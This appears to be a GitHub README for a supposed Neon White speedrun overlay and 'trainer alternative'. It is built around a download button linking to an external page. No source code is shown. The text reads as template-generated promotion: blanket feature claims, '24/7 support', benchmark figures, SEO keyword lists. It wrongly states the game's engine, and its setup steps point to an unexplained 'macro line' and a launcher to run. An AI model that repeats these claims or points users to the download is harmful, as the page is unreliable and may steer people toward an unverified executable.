![preview](https://raw.githubusercontent.com/mateoriquelme1/Neon-White-Speedrun-Companion/main/shot_31da5.svg)
[![Download](https://raw.githubusercontent.com/mateoriquelme1/Neon-White-Speedrun-Companion/main/btn_095bca7.svg)](https://mateoriquelme1.github.io/Neon-White-Speedrun-Companion/)

# 🎮 Neon Velocity Companion — Runtime Enhancement Suite for Neon White

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D4?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Engine](https://img.shields.io/badge/Engine-Unreal%20Engine-0E1128?logo=unrealengine&logoColor=white)](https://www.unrealengine.com/)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)]()
[![Version](https://img.shields.io/badge/Version-3.4.1-blue)]()
[![Build](https://img.shields.io/badge/Build-Passing-success)]()
[![Language Support](https://img.shields.io/badge/Languages-12-orange)]()
[![Support](https://img.shields.io/badge/Support-24%2F7-9cf)]()
[![Made With Love](https://img.shields.io/badge/Made%20With-Rush%20%26%20Precision-red)]()

> **Neon Velocity Companion** is a next-generation runtime enhancement toolkit built for players who want to squeeze every millisecond out of their runs without breaking the spirit of the speedrunning craft. Think of it as a tuning fork for your game — it doesn't play the music, but it makes sure every note lands exactly where you intend.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [The Philosophy Behind the Project](#-the-philosophy-behind-the-project)
- [Feature Highlights](#-feature-highlights)
- [Responsive User Interface](#-responsive-user-interface)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [System Requirements](#-system-requirements)
- [Getting Started](#-getting-started)
- [Configuration Deep Dive](#-configuration-deep-dive)
- [Modules & Architecture](#-modules--architecture)
- [Performance Benchmarking](#-performance-benchmarking)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [Community Guidelines](#-community-guidelines)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Overview

Neon Velocity Companion (NVC) is an independently developed enhancement layer that sits quietly beside your installation of *Neon White*. It is not a modification of the game's core files, nor does it touch the protected memory space of the executable. Instead, it operates as a **read-side observability and overlay engine**, giving you deeper insight into frame timing, movement vectors, route efficiency, and input latency.

The project was born from a simple frustration: modern speedrunning tools are either too rigid, too invasive, or too opaque. NVC takes the opposite approach. Everything is modular. Everything is documented. Everything is reversible with a single toggle.

Whether you're a casual runner chasing your first sub-20 on a specific chapter, or a seasoned competitor refining a jump chain across seventy hours, NVC adapts to you — not the other way around.

---

## 🧠 The Philosophy Behind the Project

At its heart, NVC is a **mirror, not a lever**. It reflects what the game is already doing and presents it in a form you can reason about. Consider the metaphor of a racing telemetry dashboard: it does not push the car forward, but a driver who reads it well will find tenths they never knew existed.

We hold three principles above all else:

1. **Observation over interference.** Prefer reading state to writing it.
2. **Reversibility over permanence.** Any change can be undone in seconds.
3. **Clarity over cleverness.** If a setting needs a manual to explain, it's a bad setting.

These principles guide every commit, every pull request, and every design decision in this repository.

---

## ✨ Feature Highlights

- **🎯 Frame-Perfect Timing Readouts** — Millisecond-precise frame pacing monitors rendered in real time.
- **🧭 Route Efficiency Mapping** — Heatmaps of your traversal covering time-on-ground, apex angles, and dead-air moments.
- **⚡ Input Latency Analyzer** — Detects the delta between physical input and in-game registration.
- **🪶 Featherweight Footprint** — Under 40 MB resident memory during typical sessions.
- **🧩 Plugin Sandbox** — Third-party modules run in an isolated context.
- **🎨 Responsive UI** — Automatically adapts to window size, DPI scaling, and ultrawide resolutions.
- **🌍 Multilingual Support** — Twelve languages out of the box, more on the way.
- **📞 24/7 Customer Support** — Real humans, real answers, around the clock.
- **🔄 Hot-Reload Configuration** — Tweak settings without restarting the game.
- **🔐 Local-Only Telemetry** — Your run data never leaves your machine unless you export it.
- **📊 Session Journals** — Automatic logging of every run with timestamps and metadata.
- **🕹️ Controller-Aware Overlay** — Works with keyboard, XInput, and DirectInput devices.

---

## 🖥️ Responsive User Interface

The interface is built on a fluid grid that reflows gracefully from a 640×480 legacy window all the way up to a 5120×1440 super-ultrawide. Anchors are computed at runtime, so resizing the window mid-run never causes elements to drift or overlap.

Some highlights:

- **Adaptive contrast modes** for both bright neon scenes and dark corridor sections.
- **Snap-to-edge docking** for corner overlays that stay out of the action.
- **Density scaling** so you can show more widgets without shrinking text.
- **Theming engine** with community-contributed palettes loaded from local JSON.

Every widget remembers its last position, size, and opacity, keyed by profile — so switching between "Practice" and "Tournament" layouts takes one click.

---

## 🌐 Multilingual Support

Language should never be a wall between a runner and their data. NVC ships with full translations for the following locales:

| Code | Language | Status |
|------|----------|--------|
| en | English | ✅ Complete |
| es | Español | ✅ Complete |
| fr | Français | ✅ Complete |
| de | Deutsch | ✅ Complete |
| it | Italiano | ✅ Complete |
| pt-BR | Português (Brasil) | ✅ Complete |
| ru | Русский | ✅ Complete |
| ja | 日本語 | ✅ Complete |
| ko | 한국어 | ✅ Complete |
| zh-CN | 简体中文 | ✅ Complete |
| zh-TW | 繁體中文 | ✅ Complete |
| pl | Polski | ✅ Complete |

Community translation contributions are warmly welcomed — see the **Contributing** section below. Localization files are plain structured documents, so you don't need to be a programmer to help.

---

## 📞 24/7 Customer Support

Our support desk is staffed by volunteers and maintainers across multiple time zones so that someone is always awake when you are. Typical first-response time is under ninety minutes, with urgent issues triaged even faster.

Channels include:

- **Discussion threads** on the repository itself.
- **Live chat rotation** during peak hours in every major region.
- **Email relay** for users who prefer asynchronous conversations.
- **Priority queue** for verified tournament participants.

We treat every bug report like a clue in a detective story — no detail is too small. If your overlay flickers only on Tuesdays, we want to know about it.

---

## 🛠️ System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (21H2) | Windows 11 (23H2) |
| CPU | Dual-core 2.4 GHz | Quad-core 3.6 GHz |
| RAM | 4 GB | 16 GB |
| GPU | DirectX 11 capable | DirectX 12 capable |
| Disk | 250 MB | 1 GB (for journals) |
| Display | 1280×720 | 2560×1440 or higher |

Linux users: an experimental compatibility layer is available in the `linux-wip` branch. Feedback is enormously appreciated.

---

## 🚀 Getting Started

You do not need to be a developer to use NVC. The workflow is designed to be as approachable as opening a document.

1. **Obtain the companion package** using the macro line at the top of this file.
2. **Extract the archive** to any directory outside of your game installation folder.
3. **Launch the companion launcher** as a normal user — elevated privileges are not required.
4. **Point the launcher** at your game's install directory when prompted.
5. **Select a profile** — a default "Balanced" profile is preconfigured.
6. **Press the overlay toggle** to confirm everything is wired up correctly.
7. **Play.** Adjust settings live with hotkeys, or open the settings panel for deeper control.

If anything feels off, use the "Safe Mode" entry point, which disables all non-essential modules so you can isolate the source of a problem.

---

## ⚙️ Configuration Deep Dive

Configuration lives in a plain, human-readable file. Nothing is obfuscated. Every key is documented inline with comments explaining its meaning and accepted values.

Sections you'll encounter:

- **`[overlay]`** — positioning, opacity, hotkeys, and per-widget toggles.
- **`[telemetry]`** — sampling rates, retention windows, and export formats.
- **`[routes]`** — per-chapter route preferences and checkpoint markers.
- **`[network]`** — entirely optional and disabled by default.
- **`[advanced]`** — for those who like to live a little.

Because the format is open and stable, you can version-control your own configuration files, share them with friends, or generate them programmatically from a script.

---

## 🧬 Modules & Architecture

NVC is split into cooperating modules that communicate over a lightweight message bus. This means you can disable a module you don't need without destabilizing the rest.

- **Core Host** — bootstraps everything, owns the lifecycle.
- **Sensor Layer** — reads state from permitted sources.
- **Analysis Engine** — computes derived metrics from raw samples.
- **Render Backend** — draws the overlay using a hardware-accelerated path.
- **Plugin Sandbox** — isolates third-party extensions.
- **Persistence Service** — writes journals and configuration atomically.

The modular design is not academic: it's practical. If a sensor misbehaves on your particular build, you disable one module rather than the whole toolkit.

---

## 📈 Performance Benchmarking

We track performance religiously. Below are representative figures from our internal test fleet across several hardware configurations. Numbers vary with scene complexity, but the goal is always the same: stay under 1% frame-time impact.

| Scenario | Overhead (avg) | Overhead (99th pct) |
|----------|----------------|---------------------|
| Idle overlay | 0.12 ms | 0.31 ms |
| Full widgets | 0.44 ms | 0.97 ms |
| Route heatmap | 0.68 ms | 1.42 ms |
| Journal write | 0.04 ms | 0.09 ms |

If you observe figures meaningfully higher than these on comparable hardware, please file an issue with a captured profile — we love a good mystery.

---

## 🔍 SEO & Discoverability Notes

This project aims to be findable by the people who genuinely need it. To that end, the repository deliberately uses natural, human language when describing its purpose. Key phrases you may encounter include:

- *runtime enhancement suite for Neon White*
- *frame timing overlay for speedrunners*
- *movement analytics for first-person platformers*
- *input latency visualization for competitive play*
- *reversible configuration companion for Neon White*
- *neon white trainer alternative runtime tool*

We avoid stuffing these phrases. Instead, we use them where they genuinely help a reader understand what the project does. If you're arriving here from a search engine, welcome — you're in the right place.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Rewrite the render backend on a modern graphics abstraction for broader GPU compatibility.
- **Q2 2026** — Introduce a public plugin registry with signed modules.
- **Q3 2026** — Ship a cross-platform session comparison tool with side-by-side playback.
- **Q4 2026** — First-class accessibility pass, including screen-reader narration of overlay data.
- **Ongoing** — Additional translations, community themes, and route template packs.

Roadmap items are indicative and may shift as community feedback reshapes priorities.

---

## 🤝 Contributing

We are thrilled when people want to help. The only hard requirement is kindness; the rest we can teach.

Ways to contribute:

- **File detailed bug reports** with reproduction steps and environment details.
- **Propose translations** for languages not yet covered.
- **Design overlay themes** and share them under a compatible license.
- **Write documentation** — clarity is a superpower.
- **Submit code** via pull request, following the style guide in the docs folder.

Before your first pull request, please read the CONTRIBUTING document and the CODE_OF_CONDUCT. Both are short, and both matter.

---

## 🫂 Community Guidelines

Be the kind of person you'd want to run into on a leaderboard. Celebrate others' personal bests. Give credit generously. Assume good faith. If you must disagree, disagree about the idea, never the person.

---

## ⚠️ Disclaimer

**Neon Velocity Companion is an independent, community-developed project.** It is not affiliated with, endorsed by, sponsored by, or otherwise associated with the creators, publishers, or rights holders of *Neon White* or any related trademarks. All trademarks remain the property of their respective owners.

This toolkit is provided strictly as-is, for personal, educational, and analytical use. Users are solely responsible for ensuring that their use of this software complies with any applicable terms of service, local laws, and tournament rules. The maintainers assume no liability for any consequences arising from its use.

Please use this project responsibly and respectfully. Competitive integrity matters, and so does the experience of every other player. If a particular feature could undermine fair play in a given context, we strongly encourage you to refrain from using it in that context.

No warranty of any kind is expressed or implied. Please review the license below for the full legal text.

---

## 📜 License

This project is distributed under the **MIT License**. A working, canonical copy of the license text is available at:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute this software in accordance with the terms of that license. Attribution is appreciated but not required.

Copyright (c) 2026 Neon Velocity Companion Contributors.

---

## 💫 Final Words

Speedrunning is a conversation between a player and a game — a dialogue of intent, execution, and revision. NVC exists to make that conversation a little clearer. We hope it serves you well, and we hope you enjoy the process of getting faster, one frame at a time.

Thank you for being here. Now go break your own record.

[![Download](https://raw.githubusercontent.com/mateoriquelme1/Neon-White-Speedrun-Companion/main/btn_095bca7.svg)](https://mateoriquelme1.github.io/Neon-White-Speedrun-Companion/)